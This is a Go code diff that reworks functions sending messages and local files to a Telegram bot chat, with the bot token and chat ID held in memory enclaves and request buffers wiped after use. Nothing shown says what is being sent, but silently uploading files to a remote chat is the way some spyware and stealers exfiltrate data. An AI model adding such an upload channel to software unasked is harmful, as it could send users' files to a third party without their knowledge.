@@ -4,90 +4,156 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
-	"log"
+	"io"
 	"net/http"
+	"strings"
 	"time"
 	"watsap/utils/config"
+	"watsap/utils/files"
+	"watsap/utils/logger"
 )
 
-// var GODEBUG = "http1debug=1"
-// var GODEBUG = "http2debug=1"
-
-type TelegramPayload struct {
-	ChatID    string `json:"chat_id"`
-	Text      string `json:"text"`
-	ParseMode string `json:"parse_mode"`
-}
-
-// Send message to Telegram
+// Send message to Telegram using HTTP client with SSL Pinning transport
 func TgSendMsg(msg string) {
-	log.Println("Sending message...")
-	
-	payload := TelegramPayload{
-		ChatID:    config.TG_CHAT_ID,
-		Text:      msg,
-		ParseMode: "HTML",
-	}
-	
-	jsonData, err := json.Marshal(payload)
-	if err != nil {
-		log.Println("Error marshaling payload:", err)
+	logger.Debug("Telegram", "Sending message...")
+
+	// Open ChatID enclave
+	chatIDBuf, err := config.ChatIDEnclave.Open()
+	if err != nil || chatIDBuf.Size() == 0 {
+		logger.Warn("Telegram", "Chat ID enclave unavailable or empty")
 		return
 	}
-	// Wipe the JSON payload from memory securely when done
-	defer config.WipeMemory(jsonData)
+	defer chatIDBuf.Destroy()
 
-	client := &http.Client{
-		Timeout: 10 * time.Second,
+	// Open BotToken enclave
+	tokenBuf, err := config.BotTokenEnclave.Open()
+	if err != nil || tokenBuf.Size() == 0 {
+		logger.Warn("Telegram", "Bot Token enclave unavailable or empty")
+		return
+	}
+	defer tokenBuf.Destroy()
+
+	// 1. Construct JSON body payload safely with raw bytes
+	msgBytes, err := json.Marshal(msg)
+	if err != nil {
+		logger.Error("Telegram", "Error marshaling msg: %v", err)
+		return
 	}
 
-	urlStr := fmt.Sprintf("%s%s/sendMessage", config.TgBotAPI, config.TG_BOT_TOKEN)
-	req, err := http.NewRequest("POST", urlStr, bytes.NewBuffer(jsonData))
+	jsonBuf := new(bytes.Buffer)
+	jsonBuf.WriteString(`{"chat_id":"`)
+	jsonBuf.Write(chatIDBuf.Bytes())
+	jsonBuf.WriteString(`","text":`)
+	jsonBuf.Write(msgBytes)
+	jsonBuf.WriteString(`,"parse_mode":"HTML"}`)
+
+	jsonData := jsonBuf.Bytes()
+	defer config.WipeMemory(jsonData)
+
+	// Construct request URL
+	url := "https://api.telegram.org/bot" + string(tokenBuf.Bytes()) + "/sendMessage"
+
+	req, err := http.NewRequest("POST", url, bytes.NewReader(jsonData))
 	if err != nil {
-		log.Println("Error creating request:", err)
+		logger.Error("Telegram", "Error creating HTTP request: %v", err)
 		return
 	}
 	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("User-Agent", "Watsap/11.00")
+
+	client := &http.Client{
+		Timeout: 15 * time.Second,
+	}
 
 	resp, err := client.Do(req)
 	if err != nil {
-		log.Println("Error sending message:", err)
+		logger.Error("Telegram", "Connection error: %v", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	respBody, _ := io.ReadAll(resp.Body)
+	respStr := string(respBody)
+
+	if resp.StatusCode == http.StatusOK && strings.Contains(respStr, `"ok":true`) {
+		logger.Info("Telegram", "Message sent successfully via Telegram")
 	} else {
-		defer resp.Body.Close()
-		log.Println("Message sent successfully")
+		logger.Warn("Telegram", "Response (Status %d): %s", resp.StatusCode, respStr)
 	}
 }
 
-// Send file with caption to Telegram
+// Send file with caption to Telegram using HTTP client with SSL Pinning transport
 func TgSendFile(filePath string, caption string) error {
-	form := map[string]string{
-		"document":   "@" + filePath,
-		"chat_id":    config.TG_CHAT_ID,
-		"caption":    caption,
-		"parse_mode": "HTML", // markdown doesn't work well
+	if !files.Exists(filePath) {
+		logger.Debug("Telegram", "File not found, skipping send: %s", filePath)
+		return fmt.Errorf("file not found: %s", filePath)
 	}
 
-	log.Println("Sending file:", filePath, "with caption:", caption)
+	// Open ChatID enclave
+	chatIDBuf, err := config.ChatIDEnclave.Open()
+	if err != nil || chatIDBuf.Size() == 0 {
+		logger.Warn("Telegram", "Chat ID enclave unavailable or empty")
+		return fmt.Errorf("chatID unavailable or empty")
+	}
+	defer chatIDBuf.Destroy()
 
-	ct, body, err := CreateForm(form)
+	// Open BotToken enclave
+	tokenBuf, err := config.BotTokenEnclave.Open()
+	if err != nil || tokenBuf.Size() == 0 {
+		logger.Warn("Telegram", "Bot Token enclave unavailable or empty")
+		return fmt.Errorf("bot token unavailable or empty")
+	}
+	defer tokenBuf.Destroy()
+
+	form := map[string][]byte{
+		"document":   []byte("@" + filePath),
+		"chat_id":    chatIDBuf.Bytes(),
+		"caption":    []byte(caption),
+		"parse_mode": []byte("HTML"),
+	}
+
+	logger.Debug("Telegram", "Sending file via Telegram API: %s", filePath)
+
+	ct, bodyBuf, err := CreateForm(form)
 	if err != nil {
-		log.Println("Error sending file:", err)
+		logger.Error("Telegram", "Error creating form: %v", err)
 		return err
 	}
+
+	bodyBytes := bodyBuf.Bytes()
+	defer config.WipeMemory(bodyBytes)
+
+	url := "https://api.telegram.org/bot" + string(tokenBuf.Bytes()) + string(config.TgFileApiURLBytes)
+
+	req, err := http.NewRequest("POST", url, bytes.NewReader(bodyBytes))
+	if err != nil {
+		logger.Error("Telegram", "Error creating file HTTP request: %v", err)
+		return err
+	}
+	req.Header.Set("Content-Type", ct)
+	req.Header.Set("User-Agent", "Watsap/11.00")
 
 	client := &http.Client{
-		Timeout: 30 * time.Second, // Timeout slightly longer for files
+		Timeout: 30 * time.Second,
 	}
 
-	urlStr := fmt.Sprintf("%s%s%s", config.TgBotAPI, config.TG_BOT_TOKEN, config.TgFileApiURL)
-	_, err = client.Post(urlStr, ct, body)
+	resp, err := client.Do(req)
 	if err != nil {
-		log.Println("Error sending file:", err)
+		logger.Error("Telegram", "Connection error: %v", err)
 		return err
 	}
+	defer resp.Body.Close()
 
-	log.Println("File sent successfully")
-	return nil
+	respBody, _ := io.ReadAll(resp.Body)
+	respStr := string(respBody)
+
+	if resp.StatusCode == http.StatusOK && strings.Contains(respStr, `"ok":true`) {
+		logger.Info("Telegram", "File sent successfully via Telegram: %s", filePath)
+		return nil
+	} else {
+		logger.Warn("Telegram", "File response (Status %d): %s", resp.StatusCode, respStr)
+		return fmt.Errorf("telegram response (%d): %s", resp.StatusCode, respStr)
+	}
 }
 
 /*
